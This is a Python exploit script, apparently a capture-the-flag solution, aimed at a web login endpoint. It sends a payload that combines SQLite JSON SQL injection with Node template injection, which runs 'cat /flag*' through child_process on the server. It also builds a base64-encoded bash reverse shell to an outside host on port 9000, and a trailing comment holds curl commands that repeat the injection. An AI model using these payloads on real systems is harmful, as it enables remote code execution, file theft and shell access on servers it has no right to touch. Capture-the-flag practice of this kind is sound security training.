import requests
import base64
import urllib.parse
import json


def test():
    url = "http://10.113.184.121:10081/login"
    url = "http://127.0.0.1:3000/login"
    command = base64.b64encode(
        f"/bin/bash -i >& /dev/tcp/linux1.cs.nctu.edu.tw/9000 0>&1".encode()
    ).decode()
    command = urllib.parse.quote(f"echo {command}|base64 -d|bash")
    command = "id"
    command = f"echo {command}|base64 -d|bash"
    data = {
        "username": "\", '$.admin.password')->>'$[1]' as password from db -- ; <%= global.process.mainModule.require('child_process').execSync('cat /flag*').toString() %>;",
        "password": "FLAG{flag-1}",
        # "password": "FLAG{sqlite_js0n_inject!on}",
    }
    # data = json.dumps(data)
    r = requests.post(url, data=data)
    print(r.request.headers)
    print(r.request.body)
    print(json.dumps(data, indent=4, sort_keys=True))
    print(r.text)


def main():
    pass


if __name__ == "__main__":
    test()

"""
curl -v http://localhost:3000/login -d username:'", \'$.admin.password\')->>\'$[1]\' as password from db --'&password='FLAG{flag-1}'
curl -X POST http://10.113.184.121:10081/login --data username='", \'$.admin.password\')->>\'$[1]\' as password from db -- <%= global.process.mainModule.require(\'child_process\').execSync(\'cat /flag*\').toString() %>' --data password='FLAG{sqlite_js0n_inject!on}'
"""
